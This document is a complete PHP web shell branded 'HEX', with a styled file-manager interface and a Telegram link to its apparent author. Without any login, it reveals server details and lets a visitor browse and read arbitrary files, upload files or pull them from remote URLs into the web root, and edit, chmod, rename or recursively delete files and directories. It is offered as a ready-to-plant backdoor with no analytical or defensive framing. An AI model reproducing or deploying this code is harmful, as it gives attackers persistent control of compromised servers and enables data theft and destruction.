<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>HEX</title>

    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">

    <style>

        * {

            margin: 0;

            padding: 0;

            box-sizing: border-box;

        }



        body {

            font-family: 'JetBrains Mono', monospace;

            background: #0d1117;

            color: #c9d1d9;

            line-height: 1.6;

            font-size: 14px;

            min-height: 100vh;

            padding: 20px;

        }



        .container {

            max-width: 1000px;

            margin: 0 auto;

        }



        /* Header */

        .header {

            background: #161b22;

            border: 1px solid #21262d;

            border-radius: 6px;

            padding: 16px;

            margin-bottom: 16px;

        }



        .title {

            font-size: 18px;

            font-weight: 500;

            color: #58a6ff;

            margin-bottom: 12px;

        }



        .system-info {

            display: grid;

            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));

            gap: 8px;

            font-size: 12px;

        }



        .info-line {

            padding: 4px 0;

        }



        .info-label {

            color: #7d8590;

            display: inline-block;

            width: 120px;

        }



        .info-value {

            color: #f0883e;

        }



        /* Breadcrumb */

        .breadcrumb {

            background: #0d1117;

            border: 1px solid #21262d;

            border-radius: 6px;

            padding: 12px;

            margin-bottom: 16px;

            font-size: 13px;

        }



        .breadcrumb a {

            color: #58a6ff;

            text-decoration: none;

        }



        .breadcrumb a:hover {

            text-decoration: underline;

        }



        /* Upload Section */

        .upload-section {

            background: #161b22;

            border: 1px solid #21262d;

            border-radius: 6px;

            padding: 16px;

            margin-bottom: 16px;

        }



        .section-title {

            font-size: 14px;

            font-weight: 500;

            color: #f0f6fc;

            margin-bottom: 12px;

        }



        .form-row {

            margin-bottom: 12px;

        }



        .radio-group {

            display: flex;

            gap: 20px;

            margin-bottom: 12px;

        }



        .radio-item {

            display: flex;

            align-items: center;

            gap: 6px;

            font-size: 13px;

        }



        .radio-item input[type="radio"] {

            margin: 0;

        }



        input[type="file"],

        input[type="text"],

        select,

        textarea {

            background: #0d1117;

            border: 1px solid #21262d;

            border-radius: 6px;

            color: #c9d1d9;

            padding: 8px 12px;

            font-family: inherit;

            font-size: 13px;

        }



        input[type="file"]:focus,

        input[type="text"]:focus,

        select:focus,

        textarea:focus {

            outline: none;

            border-color: #58a6ff;

        }



        .btn {

            background: #21262d;

            border: 1px solid #30363d;

            border-radius: 6px;

            color: #f0f6fc;

            padding: 6px 12px;

            font-family: inherit;

            font-size: 13px;

            cursor: pointer;

            transition: all 0.2s;

        }



        .btn:hover {

            background: #30363d;

            border-color: #8b949e;

        }



        .btn-primary {

            background: #238636;

            border-color: #238636;

        }



        .btn-primary:hover {

            background: #2ea043;

        }



        .btn-danger {

            background: #da3633;

            border-color: #da3633;

        }



        .btn-danger:hover {

            background: #f85149;

        }



        .upload-row {

            display: flex;

            gap: 8px;

            align-items: end;

        }



        .upload-row input[type="file"],

        .upload-row input[type="text"] {

            flex: 1;

        }



        .upload-row input[type="text"]:last-of-type {

            max-width: 150px;

        }



        /* Messages */

        .message {

            padding: 12px;

            border-radius: 6px;

            margin: 12px 0;

            font-size: 13px;

        }



        .message-success {

            background: rgba(35, 134, 54, 0.15);

            border: 1px solid #238636;

            color: #56d364;

        }



        .message-error {

            background: rgba(218, 54, 51, 0.15);

            border: 1px solid #da3633;

            color: #f85149;

        }



        /* Table */

        .file-table {

            background: #0d1117;

            border: 1px solid #21262d;

            border-radius: 6px;

            overflow: hidden;

            margin-bottom: 20px;

        }



        table {

            width: 100%;

            border-collapse: collapse;

        }



        th {

            background: #161b22;

            padding: 12px;

            text-align: left;

            font-weight: 500;

            font-size: 13px;

            color: #f0f6fc;

            border-bottom: 1px solid #21262d;

        }



        td {

            padding: 8px 12px;

            border-bottom: 1px solid #21262d;

            font-size: 13px;

        }



        tr:hover {

            background: #161b22;

        }



        .file-link {

            color: #c9d1d9;

            text-decoration: none;

        }



        .file-link:hover {

            color: #58a6ff;

        }



        .dir-link {

            color: #58a6ff;

        }



        .size {

            color: #7d8590;

            text-align: right;

        }



        .permissions {

            font-family: 'JetBrains Mono', monospace;

            font-size: 12px;

            color: #7d8590;

        }



        .writable { color: #56d364; }

        .readonly { color: #f85149; }



        /* Action Form */

        .action-form {

            display: flex;

            gap: 4px;

            align-items: center;

        }



        .action-form select {

            font-size: 12px;

            padding: 4px 8px;

            min-width: 80px;

        }



        .action-form .btn {

            padding: 4px 8px;

            font-size: 12px;

        }



        /* Edit Form */

        .edit-form {

            background: #161b22;

            border: 1px solid #21262d;

            border-radius: 6px;

            padding: 16px;

            margin: 16px 0;

        }



        .edit-form textarea {

            width: 100%;

            min-height: 400px;

            resize: vertical;

        }



        .edit-form .form-row {

            margin-top: 12px;

        }



        /* File Preview */

        .file-preview {

            background: #0d1117;

            border: 1px solid #21262d;

            border-radius: 6px;

            padding: 16px;

            margin: 16px 0;

        }



        .file-preview pre {

            background: #161b22;

            border: 1px solid #21262d;

            border-radius: 6px;

            padding: 16px;

            overflow-x: auto;

            font-size: 12px;

            line-height: 1.45;

        }



        /* Footer */

        .footer {

            text-align: center;

            margin-top: 40px;

            padding: 20px;

        }



        .telegram-link {

            display: inline-flex;

            align-items: center;

            gap: 8px;

            background: #0088cc;

            color: white;

            text-decoration: none;

            padding: 10px 20px;

            border-radius: 6px;

            font-size: 14px;

            font-weight: 500;

            transition: background 0.2s;

        }



        .telegram-link:hover {

            background: #0099dd;

        }



        /* Responsive */

        @media (max-width: 768px) {

            .container { padding: 10px; }

            .system-info { grid-template-columns: 1fr; }

            .upload-row { flex-direction: column; }

            .upload-row input[type="text"]:last-of-type { max-width: none; }

            table { font-size: 12px; }

            th, td { padding: 6px 8px; }

        }

    </style>

</head>

<body>

    <div class="container">

        <div class="header">

            <div class="title">HEX</div>

            

            <?php

            set_time_limit(0);

            error_reporting(0);



            $disfunc = @ini_get("disable_functions");

            if (empty($disfunc)) {

                $disf = "<span class='writable'>NONE</span>";

            } else {

                $disf = "<span class='readonly'>".$disfunc."</span>";

            }



            function author() {

                echo '<div class="footer">

                        <a href="https://t.me/HEX80" class="telegram-link" target="_blank">

                            <span>@</span>

                            <span>Telegram</span>

                        </a>

                      </div>';

                exit();

            }



            function cekdir() {

                if (isset($_GET['path'])) {

                    $lokasi = $_GET['path'];

                } else {

                    $lokasi = getcwd();

                }

                if (is_writable($lokasi)) {

                    return "<span class='writable'>writable</span>";

                } else {

                    return "<span class='readonly'>readonly</span>";

                }

            }



            function cekroot() {

                if (is_writable($_SERVER['DOCUMENT_ROOT'])) {

                    return "<span class='writable'>writable</span>";

                } else {

                    return "<span class='readonly'>readonly</span>";

                }

            }



            function xrmdir($dir) {

                $items = scandir($dir);

                foreach ($items as $item) {

                    if ($item === '.' || $item === '..') {

                        continue;

                    }

                    $path = $dir.'/'.$item;

                    if (is_dir($path)) {

                        xrmdir($path);

                    } else {

                        unlink($path);

                    }

                }

                rmdir($dir);

            }



            function green($text) {

                echo "<div class='message message-success'>".$text."</div>";

            }



            function red($text) {

                echo "<div class='message message-error'>".$text."</div>";

            }

            ?>



            <div class="system-info">

                <div class="info-line">

                    <span class="info-label">Server:</span>

                    <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>

                </div>

                <div class="info-line">

                    <span class="info-label">System:</span>

                    <span class="info-value"><?php echo php_uname(); ?></span>

                </div>

                <div class="info-line">

                    <span class="info-label">User:</span>

                    <span class="info-value"><?php echo @get_current_user()." (".@getmyuid().")"; ?></span>

                </div>

                <div class="info-line">

                    <span class="info-label">PHP:</span>

                    <span class="info-value"><?php echo @phpversion(); ?></span>

                </div>

                <div class="info-line" style="grid-column: 1 / -1;">

                    <span class="info-label">Disabled:</span>

                    <span class="info-value"><?php echo $disf; ?></span>

                </div>

            </div>

        </div>



        <div class="breadcrumb">

            <?php

            foreach($_POST as $key => $value){

                $_POST[$key] = stripslashes($value);

            }



            if(isset($_GET['path'])){

                $lokasi = $_GET['path'];

                $lokdua = $_GET['path'];

            } else {

                $lokasi = getcwd();

                $lokdua = getcwd();

            }



            $lokasi = str_replace('\\','/',$lokasi);

            $lokasis = explode('/',$lokasi);

            $lokasinya = @scandir($lokasi);



            echo "$ pwd: ";

            foreach($lokasis as $id => $lok){

                if($lok == '' && $id == 0){

                    $a = true;

                    echo '<a href="?path=/">/</a>';

                    continue;

                }

                if($lok == '') continue;

                echo '<a href="?path=';

                for($i=0;$i<=$id;$i++){

                    echo "$lokasis[$i]";

                    if($i != $id) echo "/";

                } 

                echo '">'.$lok.'</a>/';

            }

            ?>

        </div>

        <div class="upload-section">

            <div class="section-title">Upload Files</div>



            <?php

            if (isset($_POST['upwkwk'])) {

                if (isset($_POST['berkasnya'])) {

                    if ($_POST['dirnya'] == "2") {

                        $lokasi = $_SERVER['DOCUMENT_ROOT'];

                    }

                    $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));

                    if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {

                        green("File uploaded: ".$lokasi."/".$_FILES['berkas']['name']);

                    } else {

                        red("Upload failed");

                    }

                } elseif (isset($_POST['linknya'])) {

                    if (empty($_POST['namalink'])) {

                        red("Filename cannot be empty");

                    } else {

                        if ($_POST['dirnya'] == "2") {

                            $lokasi = $_SERVER['DOCUMENT_ROOT'];

                        }

                        $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));

                        if (file_exists($lokasi."/".$_POST['namalink'])) {

                            green("File uploaded: ".$lokasi."/".$_POST['namalink']);

                        } else {

                            red("Upload failed");

                        }

                    }

                }

            }

            ?>



            <form enctype="multipart/form-data" method="post">

                <div class="form-row">

                    <div class="radio-group">

                        <label class="radio-item">

                            <input type="radio" value="1" name="dirnya" checked>

                            <span>current [<?php echo cekdir(); ?>]</span>

                        </label>

                        <label class="radio-item">

                            <input type="radio" value="2" name="dirnya">

                            <span>docroot [<?php echo cekroot(); ?>]</span>

                        </label>

                    </div>

                </div>



                <input type="hidden" name="upwkwk" value="aplod">

                

                <div class="form-row">

                    <div class="upload-row">

                        <input type="file" name="berkas">

                        <button type="submit" name="berkasnya" class="btn btn-primary">Upload</button>

                    </div>

                </div>



                <div class="form-row">

                    <div class="upload-row">

                        <input type="text" name="darilink" placeholder="https://example.com/file.txt">

                        <input type="text" name="namalink" placeholder="filename">

                        <button type="submit" name="linknya" class="btn btn-primary">Fetch</button>

                    </div>

                </div>

            </form>

        </div>



        <?php

        if (isset($_GET['fileloc'])) {

            echo "<div class='file-preview'>";

            echo "<div class='section-title'>File: ".$_GET['fileloc']."</div>";

            echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";

            echo "</div>";

            author();

        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {

            if (is_dir($_POST['path'])) {

                xrmdir($_POST['path']);

                if (file_exists($_POST['path'])) {

                    red("Failed to delete directory");

                } else {

                    green("Directory deleted");

                }

            } elseif (is_file($_POST['path'])) {

                @unlink($_POST['path']);

                if (file_exists($_POST['path'])) {

                    red("Failed to delete file");

                } else {

                    green("File deleted");

                }

            }

        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {

            echo "<div class='edit-form'>";

            echo "<div class='section-title'>chmod ".$_POST['path']."</div>";

            echo '<form method="post">

            <div class="form-row">

                <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" placeholder="0644" />

                <input type="hidden" name="path" value="'.$_POST['path'].'">

                <input type="hidden" name="pilih" value="ubahmod">

                <button type="submit" name="chm0d" class="btn btn-primary">Apply</button>

            </div>

            </form>';

            if (isset($_POST['chm0d'])) {

                $cm = @chmod($_POST['path'], $_POST['perm']);

                if ($cm == true) {

                    green("Permission changed");

                } else {

                    red("Permission change failed");

                }

            }

            echo "</div>";

        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {

            if (isset($_POST['gantin'])) {

                $ren = @rename($_POST['path'], $_POST['newname']);

                if ($ren == true) {

                    green("Renamed successfully");

                } else {

                    red("Rename failed");

                }

            }

            if (empty($_POST['name'])) {

                $namaawal = $_POST['newname'];

            } else {

                $namawal = $_POST['name'];

            }

            echo "<div class='edit-form'>";

            echo "<div class='section-title'>mv ".$_POST['path']."</div>";

            echo '<form method="post">

            <div class="form-row">

                <input name="newname" type="text" value="'.$namaawal.'" placeholder="new name" />

                <input type="hidden" name="path" value="'.$_POST['path'].'">

                <input type="hidden" name="pilih" value="gantinama">

                <button type="submit" name="gantin" class="btn btn-primary">Rename</button>

            </div>

            </form>';

            echo "</div>";

        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {

            if (isset($_POST['gasedit'])) {

                $edit = @file_put_contents($_POST['path'], $_POST['src']);

                if ($edit == true) {

                    green("File saved");

                } else {

                    red("Save failed");

                }

            }

            echo "<div class='edit-form'>";

            echo "<div class='section-title'>nano ".$_POST['path']."</div>";

            echo '<form method="post">

            <textarea name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>

            <div class="form-row">

                <input type="hidden" name="path" value="'.$_POST['path'].'">

                <input type="hidden" name="pilih" value="edit">

                <button type="submit" name="gasedit" class="btn btn-primary">Save</button>

            </div>

            </form>';

            echo "</div>";

        }

        ?>

        <div class="file-table">

            <table>

                <thead>

                    <tr>

                        <th>Name</th>

                        <th style="width: 80px;">Size</th>

                        <th style="width: 100px;">Permissions</th>

                        <th style="width: 120px;">Actions</th>

                    </tr>

                </thead>

                <tbody>

                    <?php

                    foreach($lokasinya as $dir){

                        if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;

                        echo "<tr>

                        <td>

                            <a href=\"?path=".$lokasi."/".$dir."\" class='file-link dir-link'>

                                ð ".$dir."

                            </a>

                        </td>

                        <td class='size'>--</td>

                        <td class='permissions ";

                        if(is_writable($lokasi."/".$dir)) echo 'writable';

                        elseif(!is_readable($lokasi."/".$dir)) echo 'readonly';

                        echo "'>".statusnya($lokasi."/".$dir)."</td>

                        <td>

                            <form method='POST' action='?pilihan&path=$lokasi' class='action-form'>

                                <select name='pilih'>

                                    <option value=''>--</option>

                                    <option value='hapus'>rm</option>

                                    <option value='ubahmod'>chmod</option>

                                    <option value='gantinama'>mv</option>

                                </select>

                                <input type='hidden' name='type' value='dir'>

                                <input type='hidden' name='name' value='$dir'>

                                <input type='hidden' name='path' value='$lokasi/$dir'>

                                <button type='submit' class='btn'>go</button>

                            </form>

                        </td>

                        </tr>";

                    }



                    foreach($lokasinya as $file) {

                        if(!is_file("$lokasi/$file")) continue;

                        $size = filesize("$lokasi/$file")/1024;

                        $size = round($size,3);

                        if($size >= 1024){

                            $size = round($size/1024,2).'M';

                        } else {

                            $size = $size.'K';

                        }



                        echo "<tr>

                        <td>

                            <a href=\"?fileloc=$lokasi/$file&path=$lokasi\" class='file-link'>

                                ð $file

                            </a>

                        </td>

                        <td class='size'>".$size."</td>

                        <td class='permissions ";

                        if(is_writable("$lokasi/$file")) echo 'writable';

                        elseif(!is_readable("$lokasi/$file")) echo 'readonly';

                        echo "'>".statusnya("$lokasi/$file")."</td>

                        <td>

                            <form method='post' action='?pilihan&path=$lokasi' class='action-form'>

                                <select name='pilih'>

                                    <option value=''>--</option>

                                    <option value='hapus'>rm</option>

                                    <option value='ubahmod'>chmod</option>

                                    <option value='gantinama'>mv</option>

                                    <option value='edit'>nano</option>

                                </select>

                                <input type='hidden' name='type' value='file'>

                                <input type='hidden' name='name' value='$file'>

                                <input type='hidden' name='path' value='$lokasi/$file'>

                                <button type='submit' class='btn'>go</button>

                            </form>

                        </td>

                        </tr>";

                    }

                    ?>

                </tbody>

            </table>

        </div>



        <?php

        author();



        function statusnya($file){

            $statusnya = fileperms($file);



            if (($statusnya & 0xC000) == 0xC000) {

                $ingfo = 's';

            } elseif (($statusnya & 0xA000) == 0xA000) {

                $ingfo = 'l';

            } elseif (($statusnya & 0x8000) == 0x8000) {

                $ingfo = '-';

            } elseif (($statusnya & 0x6000) == 0x6000) {

                $ingfo = 'b';

            } elseif (($statusnya & 0x4000) == 0x4000) {

                $ingfo = 'd';

            } elseif (($statusnya & 0x2000) == 0x2000) {

                $ingfo = 'c';

            } elseif (($statusnya & 0x1000) == 0x1000) {

                $ingfo = 'p';

            } else {

                $ingfo = 'u';

            }



            $ingfo .= (($statusnya & 0x0100) ? 'r' : '-');

            $ingfo .= (($statusnya & 0x0080) ? 'w' : '-');

            $ingfo .= (($statusnya & 0x0040) ?

                (($statusnya & 0x0800) ? 's' : 'x' ) :

                (($statusnya & 0x0800) ? 'S' : '-'));



            $ingfo .= (($statusnya & 0x0020) ? 'r' : '-');

            $ingfo .= (($statusnya & 0x0010) ? 'w' : '-');

            $ingfo .= (($statusnya & 0x0008) ?

                (($statusnya & 0x0400) ? 's' : 'x' ) :

                (($statusnya & 0x0400) ? 'S' : '-'));



            $ingfo .= (($statusnya & 0x0004) ? 'r' : '-');

            $ingfo .= (($statusnya & 0x0002) ? 'w' : '-');

            $ingfo .= (($statusnya & 0x0001) ?

                (($statusnya & 0x0200) ? 't' : 'x' ) :

                (($statusnya & 0x0200) ? 'T' : '-'));



            return $ingfo;

        }

        ?>

    </div>

</body>

</html>
